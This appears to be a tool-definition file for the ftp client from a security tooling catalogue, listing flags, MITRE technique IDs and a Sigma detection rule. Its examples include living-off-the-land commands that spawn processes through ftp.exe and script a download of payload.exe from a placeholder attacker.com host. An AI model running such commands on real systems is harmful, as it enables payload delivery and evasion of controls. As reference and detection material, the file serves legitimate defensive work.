---
id: network-transfer-ftp
namespace: network:transfer:ftp
name: ftp
description: File transfer protocol client
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.transfer.ftp
  - network.transfer.download
  - network.transfer.upload
platforms:
  - linux
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
features:
  - remote
  - network-intensive
  - encryption
techniques:
  - exfiltration
  - collection
  - command-and-control
  - execution
parameters:
  - name: flag-4
    type: string
    required: false
    description: "Forces tnftp to only use IPv4 addresses"
    aliases:
      - "-4"
  - name: flag-6
    type: string
    required: false
    description: "Forces tnftp to only use IPv6 addresses"
    aliases:
      - "-6"
  - name: flag-a
    type: string
    required: false
    description: "Causes tnftp to bypass normal login procedure, and use an"
    aliases:
      - -a
  - name: flag-b
    type: string
    required: false
    description: "to bufsize bytes. The default bufsize is 16384 (16 KiB)"
    aliases:
      - -b
  - name: flag-d
    type: string
    required: false
    description: "Enables debugging"
    aliases:
      - -d
  - name: flag-e
    type: string
    required: false
    description: "Disables command line editing. This is useful for Emacs"
    aliases:
      - -e
  - name: flag-f
    type: string
    required: false
    description: "Forces a cache reload for transfers that go through the FTP"
    aliases:
      - -f
  - name: flag-g
    type: string
    required: false
    description: "Disables file name globbing"
    aliases:
      - -g
  - name: flag-H
    template_key: flag-h
    type: url
    required: false
    description: "Include the provided header string as a custom HTTP header"
    aliases:
      - -H
  - name: flag-i
    type: string
    required: false
    description: "Turns off interactive prompting during multiple file trans-"
    aliases:
      - -i
  - name: flag-N
    template_key: flag-n
    type: string
    required: false
    description: "Use netrc instead of ~/.netrc. Refer to \"THE .netrc FILE\""
    aliases:
      - -N
  - name: flag-n
    type: string
    required: false
    description: "Restrains tnftp from attempting \"auto-login\" upon initial"
    aliases:
      - -n
  - name: flag-o
    type: string
    required: false
    description: "When auto-fetching files, save the contents in output"
    aliases:
      - -o
  - name: flag-P
    template_key: flag-p
    type: integer
    required: false
    description: "Sets the port number to port"
    aliases:
      - -P
  - name: flag-p
    type: string
    required: false
    description: "Enable passive mode operation for use behind connection fil-"
    aliases:
      - -p
  - name: flag-q
    type: number
    required: false
    description: "Quit if the connection has stalled for quittime seconds"
    aliases:
      - -q
  - name: flag-r
    type: string
    required: false
    description: "Retry the connection attempt if it failed, pausing for retry"
    aliases:
      - -r
  - name: flag-s
    type: string
    required: false
    description: "Set the flag-s parameter"
    aliases:
      - -s
  - name: flag-t
    type: string
    required: false
    description: "Enables packet tracing"
    aliases:
      - -t
  - name: flag-T
    template_key: flag-t
    type: number
    required: false
    description: "Set the maximum transfer rate for direction to maximum bytes/second,
      and if specified, the increment to increment bytes/second. Refer to rate for
      more information"
    aliases:
      - -T
  - name: flag-u
    type: url
    required: false
    description: "Upload files on the command line to url where url is one of the
      `ftp://' URL types as supported by auto-fetch (with an optional target filename
      for single file uploads), and file is one or more loc..."
    aliases:
      - -u
  - name: flag-v
    type: string
    required: false
    description: "Enable verbose and progress. This is the default if output"
    aliases:
      - -v
  - name: flag-x
    type: string
    required: false
    description: "Set the size of the socket send and receive buffers to xfersize
      bytes. Refer to xferbuf for more information"
    aliases:
      - -x
  - name: flag-?
    template_key: flag
    type: string
    required: false
    description: "Display help to stdout, and exit"
    aliases:
      - -?
execution:
  template: "ftp -4 {flag-4} -6 {flag-6} -a {flag-a} -b {flag-b} -d {flag-d}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars:
  target: ip
  user: user
examples:
  - description: "Basic usage with flag-4"
    command: "ftp ${flag-4}"
  - description: "Display help message"
    command: "ftp --help"
  - description: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
    command: echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
  - description: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
    command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo
      PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo
      quit>>ftp.txt&@ftp -s:ftp.txt -v"
  - description: NetRunners Active Directory/enumeration
    command: ftp -a {{IP}}
  - description: NetRunners Active Directory/enumeration
    command: ftp {{USER}}@{{IP}}
  - description: NetRunners KERBEROS/enumeration
    command: ftp -a {{IP}}
  - description: NetRunners KERBEROS/enumeration
    command: ftp {{USER}}@{{IP}}
mitre_ids:
  - T1105
  - T1202
contributor: Oddvar Moe
phase: enumeration
detections:
  - type: sigma
    url: 
      https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
  - type: ioc
    description: cmd /c as child process of ftp.exe
---

# ftp — File transfer protocol client

## Overview

`ftp` is a command-line utility for file transfer protocol client.

## Usage

```
ftp -4 {flag-4} -6 {flag-6} -a {flag-a} -b {flag-b} -d {flag-d}
```
